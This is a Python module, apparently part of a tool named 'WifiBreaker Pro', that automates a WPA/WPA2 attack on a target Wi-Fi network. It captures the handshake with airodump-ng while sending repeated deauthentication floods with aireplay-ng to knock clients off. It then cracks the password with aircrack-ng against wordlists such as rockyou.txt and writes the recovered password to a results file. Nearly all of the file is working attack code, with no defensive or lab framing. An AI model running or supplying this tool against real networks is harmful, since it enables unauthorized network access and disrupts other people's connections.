"""
WPA/WPA2 attack implementation.
Captures handshake and performs dictionary attack.
This module uses multithreading and aircrack-ng checks to stop the capture
process immediately upon detecting the WPA Handshake.
"""

import subprocess
import time
import os
import re
import threading
import glob
from typing import Optional, List
from core.scanner import WiFiNetwork
from ui.colors import Colors, print_info, print_success, print_error, print_warning, print_progress


class WPAAttack:
    """WPA/WPA2 handshake capture and cracking."""
    
    def __init__(self, interface: str, target: WiFiNetwork):
        self.interface = interface
        self.target = target
        self.capture_file_prefix = f"/tmp/wifibreaker_{target.bssid.replace(':', '')}_cap"
        self.handshake_captured = False
        self.airodump_process: Optional[subprocess.Popen] = None
        self.handshake_file: Optional[str] = None
        self.password: Optional[str] = None
        self.deauth_stop_event = threading.Event() 
        self.monitor_finished_event = threading.Event()
    
    def _cleanup_cap_files(self):
        """Clean up old capture files related to this BSSID."""
        for f in glob.glob(f"{self.capture_file_prefix}*"):
            try:
                os.remove(f)
            except Exception as e:
                print_warning(f"Error al limpiar archivos temporales: {e}")

    def _execute_command(self, cmd: list, timeout: int = None) -> tuple:
        """Execute a system command using sudo."""
        if cmd[0] != 'sudo' and cmd[0] in ['iwconfig', 'aireplay-ng', 'aircrack-ng']:
            cmd.insert(0, 'sudo')

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return -1, "", "Timeout"
        except FileNotFoundError:
            print_error(f"Comando no encontrado: {' '.join(cmd)}. ¿Está instalado aircrack-ng?")
            return -1, "", "Command not found"
        except Exception as e:
            return -1, "", str(e)

    def _deauth_pulse(self, target_client: Optional[str] = None):
        """Send deauth packets periodically until the stop event is set."""
        count = 10
        
        cmd_base = [
            'sudo',
            'aireplay-ng',
            '--deauth', str(count),
            '-a', self.target.bssid,
        ]

        if target_client:
            cmd = cmd_base + ['-c', target_client, self.interface]
            print_info(f"Iniciando pulso de deautenticación (dirigido a {target_client})...")
        else:
            cmd = cmd_base + [self.interface]
            print_warning("Iniciando pulso de deautenticación (broadcast, menos efectivo)...")
        
        pulse_count = 0
        while not self.deauth_stop_event.is_set():
            pulse_count += 1
            print_progress(f"Pulso {pulse_count} - Enviando {count} deauths...")
                
            self._execute_command(cmd, timeout=5) 
            self.deauth_stop_event.wait(5)
            
        print_info("Hilo de deautenticación detenido.")
            
    def _check_for_handshake(self, timeout: int = 120) -> Optional[str]:
        """
        Monitors the capture file for the WPA Handshake using aircrack-ng.
        Returns the path to the successful capture file if found.
        """
        print_info(f"Monitorizando captura para el handshake WPA de {self.target.ssid}...")
        
        start_time = time.time()
        cap_file_path: Optional[str] = None
        bssid_check_pattern = self.target.bssid.upper()
        
        try:
            while time.time() - start_time < timeout:
                time.sleep(2)
                
                if self.airodump_process and self.airodump_process.poll() is not None:
                    break
                    
                cap_files = glob.glob(f"{self.capture_file_prefix}-*.cap")
                if not cap_files:
                    continue

                current_cap_file = max(cap_files, key=os.path.getctime)
                
                if not os.path.exists(current_cap_file) or os.path.getsize(current_cap_file) < 1024:
                    print_progress(f"Esperando datos en {os.path.basename(current_cap_file)}. Tamaño: {os.path.getsize(current_cap_file)} bytes.")
                    continue

                aircrack_cmd = ['aircrack-ng', current_cap_file, '-b', self.target.bssid]
                
                try:
                    result = subprocess.run(
                        aircrack_cmd,
                        capture_output=True,
                        text=True,
                        timeout=5, 
                        check=False
                    )
                    
                    # DEBUG: Mostrar salida de aircrack-ng
                    if result.stdout:
                        print_info(f"DEBUG - Salida de aircrack-ng (primeros 300 chars):")
                        print(result.stdout[:300])
                    
                    # Verificar múltiples patrones de éxito
                    handshake_found = False
                    
                    # CORRECCIÓN: Buscar "potential targets" que indica que el archivo tiene datos válidos
                    if "1 handshake" in result.stdout.lower():
                        print_success("✓ Patrón '1 handshake' detectado")
                        handshake_found = True
                    elif "handshake" in result.stdout.lower() and bssid_check_pattern in result.stdout.upper():
                        print_success("✓ Patrón 'handshake' + BSSID detectado")
                        handshake_found = True
                    elif "potential targets" in result.stdout.lower() and bssid_check_pattern in result.stdout.upper():
                        print_success("✓ Target potencial detectado con BSSID correcto")
                        handshake_found = True
                    elif "KEY FOUND" in result.stdout.upper():
                        print_success("✓ KEY FOUND detectado")
                        handshake_found = True
                    
                    if handshake_found:
                        cap_file_path = current_cap_file
                        break

                except subprocess.TimeoutExpired:
                    continue
                except Exception as e:
                    print_error(f"Error al verificar handshake con aircrack-ng: {e}")
                    
            if cap_file_path:
                self.deauth_stop_event.set()
                self.handshake_captured = True
                self.handshake_file = cap_file_path

                if self.airodump_process and self.airodump_process.poll() is None:
                    print("\n" + "=" * 60)
                    print_success("✓ ¡Handshake Capturado! Deteniendo procesos...")
                    print("=" * 60)
                    
                    self.airodump_process.terminate()
                    try: 
                        self.airodump_process.wait(timeout=5)
                    except subprocess.TimeoutExpired: 
                        self.airodump_process.kill()
                        print_warning("Airodump-ng forzado a cerrarse (kill).")
                
                return cap_file_path
            
            print_error("\r✗ El tiempo de espera ha terminado o no se pudo capturar el handshake.")
            return None
        finally:
            self.monitor_finished_event.set()


    def capture_handshake(self, timeout: int = 120) -> bool:
        """
        Runs airodump-ng (now visible), monitors for handshake, and sends deauth
        to force the capture.
        """
        self._cleanup_cap_files()
        self.handshake_captured = False
        self.handshake_file = None
        self.deauth_stop_event.clear()
        self.monitor_finished_event.clear()
        
        print_info(f"Capturando handshake del target: {self.target.ssid}")
        print_info(f"Canal: {self.target.channel} | BSSID: {self.target.bssid}")

        if not self.target.channel:
            print_error("El canal del target es desconocido. No se puede iniciar la captura.")
            return False

        cmd_iwconfig = ['iwconfig', self.interface, 'channel', str(self.target.channel)]
        self._execute_command(cmd_iwconfig)
        print_info(f"Interfaz {self.interface} fijada al canal {self.target.channel}.")
        
        airodump_cmd = [
            'sudo', 
            'airodump-ng', 
            self.interface,
            '--bssid', self.target.bssid,
            '-c', str(self.target.channel),
            '-w', self.capture_file_prefix,
            '--output-format', 'cap'
        ]
        
        print_info("Iniciando captura de paquetes (airodump-ng en primer plano)....")
        
        deauth_thread: Optional[threading.Thread] = None
        
        try:
            self.airodump_process = subprocess.Popen(airodump_cmd)
            print_warning("Advertencia: La tabla de airodump-ng puede causar que otros mensajes se superpongan.")
            print_info("Buscando clientes activos para deautenticación...")

            monitor_thread = threading.Thread(
                target=lambda: self._check_for_handshake(timeout=timeout)
            )
            monitor_thread.daemon = True
            monitor_thread.start()
            
            target_client = self.target.clients_list[0] if self.target.clients_list else None
            deauth_thread = threading.Thread(
                target=lambda: self._deauth_pulse(target_client)
            )
            deauth_thread.daemon = True
            deauth_thread.start()

            print_info("Monitoreando... Esperando que el cliente se reconecte (Máx. 120s)")
            
            self.monitor_finished_event.wait(timeout=timeout + 10)
            
            if deauth_thread and deauth_thread.is_alive():
                 self.deauth_stop_event.set()
                 deauth_thread.join(timeout=5)
                 print_info("\rProceso de deautenticación detenido.")

            if self.handshake_captured and self.handshake_file:
                 print_success(f"Archivo de handshake guardado en: {self.handshake_file}")
                 return True
            else:
                 print_error("✗ El tiempo de espera ha terminado o no se pudo capturar el handshake.")
                 return False
            
        except Exception as e:
            print_error(f"Error general en la captura de handshake: {e}")
            return False
        finally:
            if self.airodump_process and self.airodump_process.poll() is None:
                self.airodump_process.terminate()
                print_warning("airodump-ng fue detenido por el bloque finally.")

    def _get_wordlist_path(self) -> Optional[str]:
        """Get path to wordlist file."""
        possible_paths = [
            'data/wordlists/top1000.txt',
            '/usr/share/wordlists/rockyou.txt',
            '/usr/share/john/password.lst',
            'wordlist.txt'
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                return path
        
        return None
    
    def crack_password(self, wordlist: str = None) -> bool:
        """Crack captured handshake using dictionary attack."""
        if not self.handshake_file:
            print_error("No hay handshake capturado")
            return False
        
        print_info("Iniciando ataque de diccionario...")
        
        if not wordlist:
            wordlist = self._get_wordlist_path()
        
        if not wordlist or not os.path.exists(wordlist):
            print_error("No se encontró archivo de wordlist")
            print_info("Coloca un wordlist en: data/wordlists/ o especifica una ruta válida.")
            return False
        
        print_info(f"Usando wordlist: {wordlist}")
        
        total_words = 0
        try:
            with open(wordlist, 'r', errors='ignore') as f:
                total_words = sum(1 for _ in f)
            print_info(f"Palabras en diccionario: {total_words:,}")
        except:
            pass
        
        cmd = [
            'aircrack-ng',
            '-w', wordlist,
            '-b', self.target.bssid,
            self.handshake_file
        ]
        
        print_progress("Crackeando contraseña...")
        print_warning("Esto puede tomar desde segundos hasta horas dependiendo del diccionario")
        
        self.password = None
        try:
            process = subprocess.Popen(
                ['sudo'] + cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            
            for line in process.stdout:
                if 'KEY FOUND!' in line:
                    match = re.search(r'\[ (.+) \]', line)
                    if match:
                        self.password = match.group(1)
                        print_success(f"\n✓ ¡CONTRASEÑA ENCONTRADA!")
                        print_success(f"   Password: {Colors.BOLD}{self.password}{Colors.ENDC}")
                        return True
                
                if 'Tested' in line:
                    print(f"\r{Colors.OKCYAN}{line.strip()}{Colors.ENDC}", end='', flush=True)
            
            process.wait()
            
            if self.password:
                return True
            else:
                print_error("\n✗ Contraseña no encontrada en el diccionario")
                return False
        
        except KeyboardInterrupt:
            print_warning("\n\nAtaque interrumpido por el usuario")
            process.kill()
            return False
        except Exception as e:
            print_error(f"Error durante el cracking: {e}")
            return False
    
    def execute(self) -> bool:
        """Execute full WPA attack (capture + crack)."""
        print(f"\n{Colors.HEADER}╔═══════════════════════════════════════════════════════════╗{Colors.ENDC}")
        print(f"{Colors.HEADER}║           ATAQUE WPA/WPA2 - {self.target.ssid:^24}       ║{Colors.ENDC}")
        print(f"{Colors.HEADER}╚═══════════════════════════════════════════════════════════╝{Colors.ENDC}\n")
        
        print(f"{Colors.BOLD}[Fase 1/2] Captura de Handshake{Colors.ENDC}")
        print("─" * 60)
        
        if not self.capture_handshake(timeout=120):
            print_error("Fallo en la captura del handshake")
            return False
        
        print()
        
        print(f"{Colors.BOLD}[Fase 2/2] Cracking de Contraseña{Colors.ENDC}")
        print("─" * 60)
        
        print_info("Selecciona wordlist:")
        print("  [1] Top 1000 (rápido)")
        print("  [2] Rockyou.txt (completo)")
        print("  [3] Personalizado")
        
        choice = input(f"\n{Colors.BOLD}Opción [1-3]: {Colors.ENDC}").strip()
        
        wordlist = None
        if choice == '1':
            wordlist = 'data/wordlists/top1000.txt'
        elif choice == '2':
            wordlist = '/usr/share/wordlists/rockyou.txt'
        elif choice == '3':
            wordlist = input(f"{Colors.INFO}Ruta del wordlist: {Colors.ENDC}").strip()
        
        if self.crack_password(wordlist):
            self._save_results()
            return True
        else:
            print_info("\nSugerencias:")
            print("  • Usa un diccionario más grande (rockyou.txt)")
            print("  • Genera wordlist basado en el SSID")
            print("  • Prueba con wordlists específicos del país/idioma")
            return False
    
    def _save_results(self):
        """Save attack results."""
        if not self.password:
            return
        
        results_dir = "data/results"
        os.makedirs(results_dir, exist_ok=True)
        
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        result_file = f"{results_dir}/wpa_crack_{timestamp}.txt"
        
        try:
            with open(result_file, 'w') as f:
                f.write(f"WifiBreaker Pro - WPA Attack Results\n")
                f.write(f"=" * 50 + "\n\n")
                f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"SSID: {self.target.ssid}\n")
                f.write(f"BSSID: {self.target.bssid}\n")
                f.write(f"Channel: {self.target.channel}\n")
                f.write(f"Encryption: {self.target.get_security_type()}\n")
                f.write(f"\nPassword: {self.password}\n")
                f.write(f"\nHandshake file: {self.handshake_file}\n")
            
            print_success(f"Resultados guardados en: {result_file}")
        except Exception as e:
            print_warning(f"No se pudieron guardar los resultados: {e}")
    
    def cleanup(self):
        """Clean up temporary files."""
        self._cleanup_cap_files()